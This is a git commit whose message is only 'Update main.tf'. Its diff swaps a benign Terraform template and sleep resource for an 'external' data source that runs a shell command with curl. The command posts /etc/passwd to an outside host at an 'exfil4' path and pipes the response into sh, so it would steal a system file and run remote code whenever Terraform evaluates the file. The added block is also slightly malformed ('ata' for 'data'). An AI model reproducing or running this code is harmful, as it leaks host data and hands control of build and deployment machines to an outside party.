9c8bb0a9aa5a3186b5bbcc0a1ef5dde841aba2de
snehak7-cyber <snehakkaran.7@gmail.com>
2026-09-03 11:45:27 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,17 +1,4 @@
-data "template_file" "test" {
-  template = "Hello, I am a template. My sample_var value = $${sample_var}"
-
-  vars = {
-    sample_var = var.sample_var
-  }
-}
-
-resource "null_resource" "sleep" {
-  triggers = {
-    uuid = uuid()
-  }
-
-  provisioner "local-exec" {
-    command = "sleep ${var.sleepy_time}"
-  }
+ata "external" "example" {
+ program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd
+https://839zw27nna4aklkr4z2feiviy941ssgh.net-spi.com/exfil4 | sh"]
 }
